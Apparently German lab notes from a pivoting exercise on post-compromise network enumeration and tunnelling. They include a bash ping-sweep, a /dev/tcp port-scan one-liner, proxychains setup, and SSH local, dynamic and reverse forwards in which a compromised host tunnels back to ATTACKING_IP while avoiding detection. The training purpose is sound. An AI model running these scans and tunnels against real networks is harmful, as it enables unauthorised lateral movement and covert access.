Beim Pivoting nutzen wir unsere initialen Zugang um uns weiter im Netzwerk umzusehen. 

Folgendes Bild zeigt das Konzept:

![alt text](image.png)

Wir werden folgendes lernen:

    - Enumerating eines Netzwerks mit nativen als auch statisch kompillierten Tools
    - Proxychains / FoxyProxy
    - SSH port forwarding und tunnelling (vorwiegend Unix)
    - plink.exe (Windows)
    - socat (Windows and Unix)
    - chisel (Windows and Unix)
    - sshuttle (currently Unix only)

Informationen sind essentiell, daher gilt es grundsätzlich erstmal zu enumerieren.

wir schauen uns 5 Grundlegende Wege an, die wir dafür nutzen:

    - Wir nutzen alles was wir auf der Maschine finden. Bspw. die Hosts Datei oder den ARP Cache
    - Wir nutzen Vorinstallierte Tools
    - Wir nutzen statisch kompillierte Tools
    - Wir nutzen Skript-Techniken
    - Wir nutzen lokale Tools über einen Proxy

Das ist auch ungefähr die Reihenfolge, die man nutzen sollte. Denn lokale Tools über einen Proxy zu nutzen ist sehr langsam. Daher sollte man Tools nutzen, die bereits auf der kompromettierten Maschine vorzufinden sind. Manchmal findet man bspw. auf Linux Systemen bereits ein installiertes Nmap. 
Dieses Vorgehen nennt man Living off the Land Techniken (LotL) und reduziert das Risiko aufzufliegen enorm. 

Aber zuerst sollte man sich die Informationen zusammensuchen, die man bereits auf der Maschine findet. 

- arp -a *Zeigt uns den ARP Cache an*
- Statische Mapping Einträge finden wir in /etc/hosts oder in C:/Windows/System32/drivers/etc/hosts
- /etc/resolv.conf *Zeigt uns eventuell miskonfigurierte DNS Server an* In Windows könnte man ipconfig /all
- mit dem Befehl "nmcli dev show" können wir uns alternativ in Linux dasselbe anzeigen lassen, das wir auch in der /etc/resolv.conf haben.

Kommen wir damit nicht weiter, können wir wie bereits erwähnt auch statische Tools auf das System übertragen und nutzen. Es handelt sich dabei um bereits kompollierte Dateien die keine Abhängigkeiten benötigen und daher im Prinzip auf jedem System laufen (vorausgesetzt es ist das richtige OS etc.). 

Der Unterschied zwischen statischen und dynamischen Binaries liegt in der Kompillierung. die meisten Programme nutzen irgendeine Art von externen Bibliothek wie .so unter Linux oder .dll unter Windows. Daher zählt man diese Programme zu den dynamischen. 
Bei statischen hingegen werden diese Bibliotheken bereits in das fertige Programm integriert, dass ausgeführt werden soll. In den meisten Fällen befinden sich die abhängigen Libraries nicht auf dem System, daher sind statische Binaries der Weg.

Abschließend noch das gefürchtete Scann über einen Proxy. Da diese Methode über Proxychains sehr langsam ist, sollte das der letzte Weg sein. Es können auch keine UDP Ports über einen TCP-Proxy gescannt werden. 

---
Bevor das alles jetzt anwenden schauen wir uns noch die Living off the Land Shell Techniken an. Idealerweise gibt es bereits Nmap auf dem eingenommen System. Da das allerdings nicht die Regel ist, müssen wir irgendwie anders klar kommen. Eine Möglichkeit ist die Nutzung der installierten Shell auf dem System. Die Bash-One-Liner scannt das Netzwerk mit einem Ping-Sweep nach erreichbaren Hosts:

>for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

Und mit diesem One-Liner können wir eventuell nach offenen Ports ausschau halten:

>for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

Wir sehen, dass es neben 10.200.105.200 noch die Hosts 10.200.105.1 und 10.200.105.250 gibt.

---

Wir schauen uns jetzt mal zwei Proxy Tools an: Proxychains und FoxyProxy. 
Wenn wir einen Proxy starten, öffnen wir auf unserer Maschine einen Port der mit dem kompromottierten Server verlinkt ist und uns Zugang zum Netzwerk bietet, ähnlich wie ein Tunnel, der von uns zum Netzwerk führt.

### Proxychains

Proxychain ist ein Command Line Tool welches einem anderem Befehl vorangestellt wird. 

> proxychains nc 10.200.105.200 23 

Damit proxen wir Netcat über Proxychains

In dem Kommando sehen wir keinen Port der von Proxychains selber verwendet wird. Dieser wird normalerweise aus der /etc/proxychains.conf Datei herausgelesen. 

Allerdings ist das nicht der erste Ort an dem Proxychains nachschaut. Die Reihenfolge sieht folgendermaßen aus:

    1. The current directory (i.e. ./proxychains4.conf)
    2. ~/.proxychains/proxychains4.conf
    3. /etc/proxychains4.conf

Daher ist es relativ easy, für jede Anforderung eine spezielle conf zu verwenden, ohne die Main Datei anfassen zu müssen.

Tipp:

>cp /etc/proxychains4.conf .

Wir kopieren uns die Datei einfach ins aktuelle Verzeichnis und schauen uns diese mal an:

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Wie wir sehen, wird normalweise der Port 9050 für TOR verwendet. Wir können den Port allerdings auf unsere Bedürfnisse anpassen.

Ausserdem sollten wir folgende Zeile ebenfalls bearbeiten:

```bash
## Proxy DNS requests - no leak for DNS data
# (disable all of the 3 items below to not proxy your DNS requests)
proxy_dns
```

Wir kommentiren den Eintrag aus, da es sonst beim Scannen mit Nmap zu Fehlern kommen kann.
Was müssen wir noch beachten?

- Wir können nur TCP scans nutzen -- also keine UDP oder SYN scans. ICMP Echo packets (Ping requests) funktionieren ebenfalls nicht, also müssen wir den -Pn  switch nutzen, um Nmap davon abzuhalten.

- Es wird extrem langsam sein. Versuche daher Nmap über einen Proxy nur in Verbindung mit NSE zu nutzen. Tipp: Nutze erstmal eine statische Binary um offene Ports/Hosts zu finden und scanne dann mit dem lokalen Nmap um die Script Bibliothek nutzen zu können.

### FoxyProxy

Ja was soll ich dazu sagen? Ist eine Extension für Firefox oder Chrome usw. Damit kann man bspw. den Traffic einer Webseite über einen Proxy leiten wie BurpSuite. 
Ist eigentlich selbstklärend. Kleine Info: SOCKS4 funktioniert, sollten wir allerdings braucht CHISEL SOCKS5. 

---

Okay gehen wir endlich ans Eingemachte.

Wir erstellen einen SSH Tunnel. Dafür haben wir ja bereits SSH Zugang zum Ziel. 

Wir haben zwei Möglichkeiten den Tunnel zu erstellen:

1. Port-Forwarding: Wird mit dem -L Switch ausgeführt (L wie Local). Wenn wir zum Beispiel Zugang zu 10.200.105.200 haben und wir wissen, dass ein Webserver auf 10.200.105.250 läuft, können wir eine Verbindung folgendermaßen aufbauen:

> ssh -L 8000:10.200.105.250:80 user@10.200.105.200 -fN

Wir können jetzt die Webseite auf 10.200.105.250 über die Maschine 10.200.105.200 erreichen, wenn wir zu Port 8000 auf unserer eigenen Maschine navigieren (localhost:8000). Man sollte übrigens immer einen hohen Port für die lokale Verbindung nutzen, da man dafür bspw. kein SUDO braucht und diese Ports auch selten genutzt werden. Das -f in -fN führt das ganze im Hintergrund aus, somit haben wir unsere Shell wieder sofort wieder zur Verfügung, das -N in -fN sagt SSH dass es ansonsten keine weiteren Befehle ausführen soll....nur die Verbindung aufbauen und das war es.

2. Proxies werden mit dem -D Switch ausgeführt (-D 1337). Somit öffnen wir den Port 1337 und leiten den Datenverkehr über diesen Port ins Netzwerk. Macht absolut Sinn, das ganze dann mit Proxychains zu kombinieren. 

> ssh -D 1337 user@10.200.105.200 -fN

---

Wir können auch eine Reverse Connection erstellen. Das funktioniert mit SSH sehr gut und ist auch ratsam, wenn man womöglich eine Shell hat, aber keinen SSH Zugang. Leider ist es auch etwas risikohafter, da man den Zielhost dazu benutzt, eine Verbindung zu sich selbst aufzubauen, also mit Credentials oder Keys.

1. Als erstes erstellen wir mit *ssh-keys* ein Paar neue Keys und speichern diese irgendwie.

![alt text](image-1.png)

2. Wir kopieren den Inhalt des Public Keys und bearbeiten dann die ~/.ssh/authorized_keys Datei in unserer eigenen Maschine. Eventuell musst du die Ordner/Dateien erstmal erstellen.

3. In einer neuen Zeile gibst du folgendes ein und fügst es im Public Key ein:
>command="echo 'Dieser Account wird nur zum Port Forwarding genutzt'", no-agent-forwarding,no-x11-fordwarding,no-pty

Damit stellen wir sicher, dass dieser Key nur fürs Portwarding genutzt werden kann und es keine Möglichkeit gibt, eine Shell auf unserer Maschine zu bekommen.

Die *authorized_keys* Datei sollte also so aussehen:

![alt text](image-2.png)

Wir überprüfen anschließend, ob der SSH Server auf unserem System läuft:

>sudo systemctl status ssh

Wenn er nicht läuft, sieht es so aus:

```bash
○ ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; disabled; preset: disabled)
     Active: inactive (dead)
       Docs: man:sshd(8)
             man:sshd_config(5)
```

Dann müssen wir den Service erst starten mit:

>sudo systemctl start ssh

```bash
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; disabled; preset: disabled)
     Active: active (running) since Thu 2024-05-02 11:49:36 CEST; 3s ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 103362 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 103364 (sshd)
      Tasks: 1 (limit: 9440)
     Memory: 2.6M (peak: 2.9M)
        CPU: 38ms
     CGroup: /system.slice/ssh.service
             └─103364 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

May 02 11:49:35 kali systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...
May 02 11:49:36 kali sshd[103364]: Server listening on 0.0.0.0 port 22.
May 02 11:49:36 kali sshd[103364]: Server listening on :: port 22.
May 02 11:49:36 kali systemd[1]: Started ssh.service - OpenBSD Secure Shell server.
```

Danach bleibt nur noch eine Sache übrig: Wir müssen den Key auf das System übertragen, was eigentlich absolut fail wäre. Daher haben wir Wegwerf-Keys erstellt die wir sofort löschen, wenn wir mit dem Assessment fertig sind.

Wenn wir den Key auf das System kopiert haben, können wir endlich das Port-Forwarding starten:

> ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

Pro-Tipp:
Wir können bei neueren SSH Client auch einen Reverse-Proxy erstellen:

>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

---

Um eine solche Verbindung wieder zu schließen, schauen wir uns die laufenden Prozesse an:

![alt text](image-3.png)

Wenn wir den entsprechenden Prozess gefunden haben, schließen wir ihn mit:

![alt text](image-4.png)

Beispiele:

Stell dir vor, du willst ein Reverse Portfward von Port 22 auf der Maschine (172.16.0.100) zu dem Port 2222 auf unsere Maschine (172.16.0.200) machen. Ausserdem willst du einen Key verwenden mit dem Namen id_rsa und das ganze soll im Backgrund laufen. Achja dein Username ist kali. Wie sieht der Befehl aus?

>ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN


--- 

Welchen Befehl nutzt du, um einen Proxy weiterzuleiten auf Port 8000 auf user@target.thm?

>ssh -R 8000 user@target.thm -fN

---

Du hast Zugriff auf den Server 172.16.0.50, auf dem intern ein Webserver auf Port 80 läuft. Dieser ist nur auf dem Server selbst erreichbar (127.0.0.1:80). Wie leitest du diesen auf Port 8000 auf deiner Maschine um? Achja Username ist user und das ganze soll dann im Hintergrund verschwinden.

>ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN

